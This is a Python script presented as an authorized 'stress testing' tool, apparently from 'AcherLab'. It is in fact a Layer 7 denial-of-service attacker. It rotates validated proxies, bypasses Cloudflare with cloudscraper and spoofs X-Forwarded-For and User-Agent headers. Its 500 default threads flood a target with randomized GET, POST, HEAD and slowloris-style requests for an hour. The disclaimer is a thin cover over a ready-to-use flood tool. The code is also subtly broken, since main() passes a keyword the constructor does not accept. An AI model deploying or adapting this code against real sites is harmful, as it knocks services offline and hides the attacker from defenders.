"""
AcherLab Stress Testing Engine - L7 attack simulation
FOR AUTHORIZED SECURITY TESTING ONLY

AcrhorLab khong chiu trach nhiem ve viec su dung trai phep.
Nguoi dung chiu toan bo trach nhiem phap ly.

Only use on systems you own or have permission to test.
"""

import cloudscraper, requests, threading, time, sys, argparse, random, socket, json, os
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

class ProxyValidator:
    def __init__(self, test_url="https://httpbin.org/ip", timeout=5):
        self.test_url = test_url
        self.timeout = timeout
        self.valid_proxies = {"socks5": [], "http": []}
        self.lock = threading.Lock()

    def load_raw(self, filepath="proxy_list.json"):
        if os.path.exists(filepath):
            with open(filepath, "r") as f:
                raw = json.load(f)
                for proto in ["socks5", "http", "https"]:
                    self.valid_proxies[proto] = raw.get(proto, [])

    def test_single(self, proxy_str, proto):
        d = {"http": f"socks5h://{proxy_str}",
             "https": f"socks5h://{proxy_str}"} if proto == "socks5" else {"http": f"http://{proxy_str}","https": f"http://{proxy_str}"}
        try:
            return requests.get(self.test_url, proxies=d, timeout=self.timeout).status_code == 200
        except:
            return False

    def validate_all(self):
        from copy import deepcopy
        alive = deepcopy(self.valid_proxies)
        for proto in ["socks5", "http", "https"]:
            alive[proto] = [p for p in alive[proto] if self.test_single(p, proto)]
        with self.lock:
            self.valid_proxies = alive
        print(f"[PROXY] {sum(len(v) for v in alive.values())} alive")
        return alive

    def get_random(self):
        with self.lock:
            all_p = self.valid_proxies["socks5"] + self.valid_proxies["http"] + self.valid_proxies["https"]
            if not all_p: return None, None
            p = random.choice(all_p)
            return p, ("socks5" if p in self.valid_proxies["socks5"] else "http")

class CloudflareBypass:
    def __init__(self):
        self.scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True})

    def get(self, url, headers=None, timeout=10, proxy=None):
        try:
            if proxy: self.scraper.proxies = {"http": proxy, "https": proxy}
            return self.scraper.get(url, headers=headers, timeout=timeout)
        except: return None

    def post(self, url, data=None, json_data=None, headers=None, timeout=10, proxy=None):
        try:
            if proxy: self.scraper.proxies = {"http": proxy, "https": proxy}
            if json_data: return self.scraper.post(url, json=json_data, headers=headers, timeout=timeout)
            return self.scraper.post(url, data=data, headers=headers, timeout=timeout)
        except: return None

class Layer7Attacker:
    def __init__(self, target_url, num_threads, duration, proxy_mode, cf_bypass=True):
        self.target_url = target_url
        self.num_threads = num_threads
        self.duration = duration
        self.proxy_mode = proxy_mode
        self.cf_bypass = cf_bypass
        self.stop_event = threading.Event()
        parsed = urlparse(target_url)
        self.target_host = parsed.hostname
        self.target_port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self.target_path = parsed.path or "/"
        self.pv = ProxyValidator()
        self.pv.load_raw()
        threading.Thread(target=self.pv.validate_all, daemon=True).start()
        self.cf_engine = CloudflareBypass() if cf_bypass else None
        self.request_count = 0
        self.success_count = 0
        self.lock = threading.Lock()

    def _rands(self, l=16):
        import string
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(l))

    def _headers(self):
        return {"User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"]),
            "Accept": "text/html,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.9",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"}

    def _get_proxy(self):
        if self.proxy_mode == "none": return None
        proxy_str, proto = self.pv.get_random()
        if proxy_str:
            if proto == "socks5":
                return {"http": f"socks5h://{proxy_str}", "https": f"socks5h://{proxy_str}"}
            return {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
        return None

    def _request(self, method, url, **kw):
        for attempt in range(3):
            try:
                proxy = self._get_proxy()
                h = kw.pop("headers", self._headers())
                if self.cf_engine:
                    if method == "GET": resp = self.cf_engine.get(url, headers=h, timeout=5, proxy=proxy.get("http") if proxy else None)
                    else: resp = self.cf_engine.post(url, headers=h, timeout=5, proxy=proxy.get("http") if proxy else None, data=kw.get("data"), json_data=kw.get("json"))
                else:
                    s = requests.Session()
                    if proxy: s.proxies = proxy
                    if method == "GET": resp = s.get(url, headers=h, timeout=5)
                    elif method == "POST": resp = s.post(url, data=kw.get("data"), json=kw.get("json"), headers=h, timeout=5)
                    else: return False
                if resp and resp.status_code < 500: return True
            except: pass
            time.sleep(0.1)
        return False

    def worker(self, tid):
        while not self.stop_event.is_set():
            attack_type = random.randint(1, 5)
            success = False
            if attack_type == 1:  # GET Flood
                success = self._request("GET", f"{self.target_url}?{self._rands(6)}={self._rands(8)}")
            elif attack_type == 2:  # POST form
                success = self._request("POST", self.target_url, data={"q": self._rands(16)})
            elif attack_type == 3:  # POST JSON
                success = self._request("POST", self.target_url, json={"query": self._rands(24)})
            elif attack_type == 4:  # HEAD
                s = requests.Session()
                p = self._get_proxy()
                if p: s.proxies = p
                try: success = s.head(url=self.target_url, headers=self._headers(), timeout=5).status_code < 500
                except: pass
            elif attack_type == 5:  # Slowloris-style
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((self.target_host, self.target_port))
                    s.send(f"GET {self.target_path} HTTP/1.1\r\nHost: {self.target_host}\r\n\r\n".encode())
                    s.close()
                    success = True
                except: pass

            with self.lock:
                self.request_count += 1
                if success: self.success_count += 1
                if self.request_count % 500 == 0:
                    print(f"[STATUS] {self.request_count} req | OK: {self.success_count} | Rate: {self.success_rate():.1f}%")

    def success_rate(self):
        return (self.success_count / max(1, self.request_count)) * 100

    def start(self):
        print(f"Target: {self.target_url} | Threads: {self.num_threads} | Duration: {self.duration}s | CF Bypass: {str(self.cf_bypass)}")
        workers = []
        for i in range(self.num_threads):
            t = threading.Thread(target=self.worker, args=(i,), daemon=True)
            workers.append(t)
            t.start()
        for _ in range(max(3, self.num_threads//30)):
            threading.Thread(target=self.worker, args=(0,), daemon=True).start()
        time.sleep(self.duration)
        total = self.request_count
        ok = self.success_count
        print(f"\nFinished! Total: {total} | OK: {ok} | Rate: {self.success_rate():.1f}%")

def main():
    parser = argparse.ArgumentParser(description="AcherLab Stress Tool - FOR AUTHORIZED USE ONLY")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--threads", type=int, default=500, help="Number of threads (default: 500)")
    parser.add_argument("--duration", type=int, default=3600, help="Duration in seconds (default: 3600)")
    parser.add_argument("--proxy-mode", default="both", choices=["tor","proxylist","both","none"])
    parser.add_argument("--no-cf", action="store_true", help="Disable Cloudflare bypass")
    args = parser.parse_args()

    print("AcherLab Stress Tool - FOR AUTHORIZED TESTING ONLY")
    print("You are responsible for any usage of this tool.")

    attacker = Layer7Attacker(
        url=args.url, num_threads=args.threads,
        duration=args.duration, proxy_mode=args.proxy_mode, cf_bypass=not args.no_cf
    )
    attacker.start()

if __name__ == "__main__":
    main()
